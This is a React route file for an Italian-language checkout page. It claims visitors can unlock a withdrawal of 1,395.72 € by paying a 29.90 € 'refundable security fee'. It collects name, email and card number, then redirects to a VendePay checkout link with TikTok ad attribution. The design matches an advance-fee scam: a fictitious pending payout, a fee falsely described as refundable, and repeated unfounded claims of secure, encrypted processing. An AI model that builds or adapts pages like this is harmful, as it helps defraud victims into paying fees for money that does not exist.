import { createFileRoute } from "@tanstack/react-router";
import { useState } from "react";
import { Shield, Lock, CreditCard, ArrowRight } from "lucide-react";
import { buildTrackedCheckoutUrl } from "@/lib/tiktok-attribution";

export const Route = createFileRoute("/checkout")({
  head: () => ({
    meta: [
      { title: "Pagamento sicuro | Sblocco del prelievo" },
      {
        name: "description",
        content: "Completa lo sblocco del tuo prelievo in totale sicurezza. Spese rimborsabili.",
      },
      { property: "og:title", content: "Pagamento sicuro | Sblocco del prelievo" },
      {
        property: "og:description",
        content: "Completa lo sblocco del tuo prelievo in totale sicurezza. Spese rimborsabili.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: Checkout,
});

const VENDEPAY_CHECKOUT_URL = "https://checkout.vendepay.com/2cd2b8a8-cfcf-4f72-a01f-01d7363cd7a5";

function Checkout() {
  const [formData, setFormData] = useState({
    fullName: "",
    email: "",
    cardNumber: "",
  });

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    const parts = [];
    for (let i = 0; i < v.length; i += 4) {
      parts.push(v.slice(i, i + 4));
    }
    return parts.join(" ").slice(0, 23);
  };

  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData((prev) => ({ ...prev, cardNumber: formatCardNumber(e.target.value) }));
  };

  const handleContinue = () => {
    if (!formData.fullName.trim() || !formData.email.trim() || !formData.cardNumber.trim()) {
      return;
    }
    window.location.href = buildTrackedCheckoutUrl(VENDEPAY_CHECKOUT_URL);
  };

  return (
    <main className="min-h-screen w-full bg-[#f5f5f7] px-4 py-8 text-neutral-900">
      <div className="mx-auto w-full max-w-md">
        {/* Header */}
        <div className="mb-6 flex items-center justify-center gap-2 text-sm font-medium text-neutral-900">
          <Shield className="h-4 w-4 text-emerald-500" />
          Pagamento sicuro
        </div>

        {/* Amount card */}
        <div className="mb-4 rounded-3xl bg-black p-6 text-center text-white shadow-lg">
          <p className="mb-1 text-[11px] font-bold uppercase tracking-widest text-neutral-400">
            Sblocco del prelievo di
          </p>
          <p className="mb-1 text-4xl font-black tracking-tight">1.395,72 €</p>
          <p className="text-sm text-neutral-400">
            Spese rimborsabili: <span className="font-medium text-white">29,90 €</span>
          </p>
        </div>

        {/* Reimbursement details */}
        <div className="mb-4 rounded-3xl bg-white p-5 shadow-sm">
          <h2 className="mb-4 text-[11px] font-bold uppercase tracking-widest text-neutral-500">
            Dati per il rimborso
          </h2>
          <div className="space-y-4">
            <div className="flex items-center justify-between border-b border-neutral-100 pb-3">
              <span className="text-sm text-neutral-500">Nome</span>
              <input
                type="text"
                value={formData.fullName}
                onChange={(e) => setFormData((prev) => ({ ...prev, fullName: e.target.value }))}
                placeholder="Il tuo nome completo"
                className="w-1/2 bg-transparent text-right text-sm font-medium text-neutral-900 outline-none placeholder:text-neutral-400"
              />
            </div>
            <div className="flex items-center justify-between border-b border-neutral-100 pb-3">
              <span className="text-sm text-neutral-500">E-mail</span>
              <input
                type="email"
                inputMode="email"
                autoComplete="email"
                value={formData.email}
                onChange={(e) => setFormData((prev) => ({ ...prev, email: e.target.value }))}
                placeholder="tu@email.com"
                className="w-1/2 bg-transparent text-right text-sm font-medium text-neutral-900 outline-none placeholder:text-neutral-400"
              />
            </div>
            <div className="flex items-center justify-between border-b border-neutral-100 pb-3">
              <span className="text-sm text-neutral-500">Numero di carta</span>
              <div className="relative w-1/2">
                <CreditCard className="absolute left-0 top-1/2 h-3.5 w-3.5 -translate-y-1/2 text-neutral-400" />
                <input
                  type="text"
                  inputMode="numeric"
                  value={formData.cardNumber}
                  onChange={handleCardChange}
                  placeholder="0000 0000 0000 0000"
                  className="w-full bg-transparent pl-5 text-right text-sm font-medium text-neutral-900 outline-none placeholder:text-neutral-400"
                />
              </div>
            </div>
            <div className="flex items-center justify-between pt-1">
              <span className="text-sm text-neutral-500">Spese di sicurezza</span>
              <div className="flex items-center gap-2">
                <span className="text-sm font-bold text-neutral-900">29,90 €</span>
                <span className="rounded-md bg-rose-500 px-2 py-0.5 text-[10px] font-bold uppercase text-white">
                  Rimborsabile
                </span>
              </div>
            </div>
          </div>
        </div>

        {/* Bank details section */}
        <div className="mb-4 rounded-3xl bg-white p-5 shadow-sm">
          <h2 className="mb-1 flex items-center gap-2 text-sm font-bold text-neutral-900">
            <Lock className="h-4 w-4 text-neutral-900" />
            Coordinate bancarie
          </h2>
          <p className="text-sm text-neutral-500">
            Connessione sicura e crittografata: i tuoi dati sono protetti.
          </p>
        </div>

        {/* Bottom CTA button */}
        <button
          type="button"
          onClick={handleContinue}
          className="mb-4 flex w-full items-center justify-center gap-2 rounded-full bg-rose-600 py-4 text-sm font-bold text-white shadow-md transition-all hover:bg-rose-700 active:scale-[0.99]"
        >
          Continua
          <ArrowRight className="h-4 w-4" />
        </button>

        {/* Footer */}
        <p className="text-center text-[11px] text-neutral-400">
          Processo 100% sicuro · Riferimento TT-2026-NYZI0B
        </p>
      </div>
    </main>
  );
}
